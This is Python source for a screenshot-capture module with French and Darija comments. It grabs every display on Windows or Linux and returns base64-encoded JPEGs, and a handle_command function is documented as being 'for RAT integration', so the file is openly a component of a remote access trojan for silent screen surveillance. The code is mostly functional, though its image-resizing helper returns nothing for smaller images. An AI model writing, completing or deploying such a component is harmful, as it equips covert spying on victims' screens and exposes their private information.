import io 
import base64
import sys
import json 
from typing import Dict, Any, Optional, List
from PIL import Image

try:
    import mss
    _HAS_MSS = True
except ImportError:
    _HAS_MSS = False

class screenshotTacker:
    def __init__(self, quality: int=65, max_width: int=1600):
        self.quality = max(30, min(95, quality))
        self.max_width = max_width
        self.platform = sys.platform
        self.check_platform()
        self.displays = self._detect_displays()  # Ajouté pour multi

    def check_platform(self):
        if not (self.platform.startswith('win') or self.platform.startswith('linux')):
            raise RuntimeError(f"Unsupported platform: {self.platform}")

    def _detect_displays(self) -> List[Dict]:
        """Détecte tous les écrans"""
        if not _HAS_MSS:
            return []
        try:
            with mss.mss() as sct:
                return sct.monitors[1:]  # Ignore virtuel
        except:
            return []

    def capture_mss(self)-> Optional[List[Dict]]:
        try:
            if not _HAS_MSS:
                return None
            from PIL import Image 
            
            with mss.mss() as sct:
                monitors = []
                for monitor_id, monitor in enumerate(self._detect_displays(), 1):
                    try:
                        screenshot = sct.grab(monitor)
                        img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
                        monitors.append({
                            'id': monitor_id,
                            'image': img,
                            'width': screenshot.width,
                            'height': screenshot.height
                        })
                    except:
                        continue
                return monitors if monitors else None
        except:
            return None

    def capture_windows_native(self)->Optional[List[Dict]]:
        try:
            import win32gui
            import win32ui
            import win32con
            import win32api
            from PIL import Image
            
            hdesktop = win32gui.GetActiveWindow()
            left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
            top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
            width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
            height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
            
            desktop_dc = win32gui.GetWindowDC(hdesktop)
            img_dc = win32ui.CreateDCFromHandle(desktop_dc)
            mem_dc = img_dc.CreateCompatibleDC()
            
            screenshot = win32ui.CreateBitmap()
            screenshot.CreateCompatibleBitmap(img_dc, width, height)
            mem_dc.SelectObject(screenshot)
            mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
            
            bmpinfo = screenshot.GetInfo()
            bmpstr = screenshot.GetBitmapBits(True)
            img = Image.frombytes(
                'RGB', 
                (bmpinfo['bmWidth'], bmpinfo['bmHeight']), 
                bmpstr, 'raw', 'BGRX', 0, 1
            )
            
            #cleanup
            mem_dc.DeleteDC()
            win32gui.DeleteObject(screenshot.GetHandle())
            win32gui.ReleaseDC(hdesktop, desktop_dc)
            
            return [{
                'id': 1, 
                'image': img, 
                'width': img.width, 
                'height': img.height
            }]
        except:
            return None
        
    def capture_linux_fallback(self)-> Optional[List[Dict]]:
        try:
            from PIL import ImageGrab
            
            img = ImageGrab.grab()
            return [{
                'id': 1,
                'image': img,
                'width': img.width,
                'height': img.height
            }]
            
        except Exception:
            try:
                import subprocess
                import tempfile
                import os
                from PIL import Image 
                
                with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
                    temp_path = tmp.name
                    try:
                        subprocess.run(
                            ['scrot', temp_path],
                            check=True,
                            timeout=10,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                        img = Image.open(temp_path)
                        result = [{
                            'id': 1, 
                            'image': img, 
                            'width': img.width, 
                            'height': img.height
                        }]
                    finally:
                        if os.path.exists(temp_path):
                            os.unlink(temp_path)
                    return result
            except Exception:
                return None
            
    def optimize_image(self, image: Image.Image) -> Image.Image:
        # FIX: retire param quality (utilise self.quality)
        from PIL import Image 
        
        if image.width > self.max_width:
            ratio = self.max_width / image.width
            new_height = int(image.height * ratio)
            image = image.resize((self.max_width, new_height), Image.Resampling.LANCZOS)
            
            # de RGB TO JPEG
            if image.mode != 'RGB':
                image = image.convert('RGB')
            return image
        
    def image_to_base64(self, image: Image.Image)-> Dict[str, Any]:
        #convert image to base64 avc metadata
        try:
            buffer = io.BytesIO()
            image.save(buffer, 'JPEG', quality=self.quality, optimize=True)
            buffer.seek(0)
            
            image_data = base64.b64encode(buffer.getvalue()).decode('ascii')
            size_kb = (len(image_data)*3)//4//1024
            return {
                'success':True,
                'data': image_data,
                'width': image.width,
                'height': image.height,
                'size_kb': size_kb,
                'quality': self.quality
            }
        except Exception as e :
            return {'success': False, "error": str(e)}
        
    def capture_single(self)-> Dict[str, Any]:
        #primary display
        try:
            screens = None
            
            if self.platform.startswith('win'):
                screens = self.capture_mss() or self.capture_windows_native()
            else:
                screens = self.capture_mss() or self.capture_linux_fallback()
            
            if screens and len(screens) >0:
                screen = screens[0]
                optimized_img = self.optimize_image(screen['image'])
                return self.image_to_base64(optimized_img)
            else:
                return {
                    'success': False,
                    'error': 'All capture methods failed'
                }
        except Exception as e:
            return {'success': False, 'error': str(e)}
        
    def capture_multiple(self)-> Dict[str, Any]:
        #capture all screens li kayen
        try:
            screens = None
            
            if self.platform.startswith('win'):
                screens = self.capture_mss() or self.capture_windows_native()
            else:
                screens = self.capture_mss() or self.capture_linux_fallback()
            
            if not screens:
                #fallback ll single disp
                single_result = self.capture_single()
                if single_result['success']:
                    return {
                        'success': True,
                        'displays': 1,
                        'results': [single_result]
                    }
                else:
                    return {'success': False, 'error': 'Multi-capture failed'}
                
                #process all screens 
            results =[]
            for screen in screens:
                optimized_img = self.optimize_image(screen['image'])
                result = self.image_to_base64(optimized_img)
                if result['success']:
                    result['display_id'] = screen['id']
                    results.append(result)
            
            return {
                'success': True,
                'displays': len(results),
                'results': results
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
        
        
    def update_config(self, quality:int=None, max_width:int = None)-> Dict[str, Any]:
        #updt cap config
        if quality is not None:
            self.quality = max(30, min(95, quality))
        if max_width is not None:
            self.max_width = max_width
        
        return {
            'quality': self.quality,
            'max_width': self.max_width
        }
    
capture_instance = None
    
def get_capturer(quality:int=65, max_width:int=1600)->screenshotTacker:
    #avoir une cap instance
    global capture_instance
    if capture_instance is None:
        capture_instance = screenshotTacker(quality=quality, max_width=max_width)
    return capture_instance

def take_screenshot(quality:int=65, multi_display:bool=False)->Dict[str,Any]:
    #main fnct capture ecran
    capturer = get_capturer(quality)
    if multi_display:
        return capturer.capture_multiple()
    else:
        return capturer.capture_single()
    

def handle_command(command_data: str) -> str:
    """Handle JSON commands for RAT integration"""
    try:
        command = json.loads(command_data)
        cmd_type = command.get('type', 'screenshot')
        quality = command.get('quality', 65)
        multi = command.get('multi_display', False)
        
        if cmd_type == 'screenshot':
            result = take_screenshot(quality=quality, multi_display=multi)
        elif cmd_type == 'config':
            capturer = get_capturer()
            config = capturer.update_config(
                quality=command.get('quality'),
                max_width=command.get('max_width')
            )
            result = {'success': True, 'config': config}
        else:
            result = {'success': False, 'error': 'Unknown command type'}
        
        return json.dumps(result)
        
    except Exception as e:
        return json.dumps({'success': False, 'error': str(e)})
    
    
if __name__ == "__main__":
    try:
        result = take_screenshot(quality=70)
        if result['success']:
            print(f"SUCCESS: {result['width']}x{result['height']} - {result['size_kb']}KB")
            
        else:
            print(f"FAILED: {result.get('error', 'Unknown error')}")
    except Exception as e:
        print(f"INIT FAILED: {e}")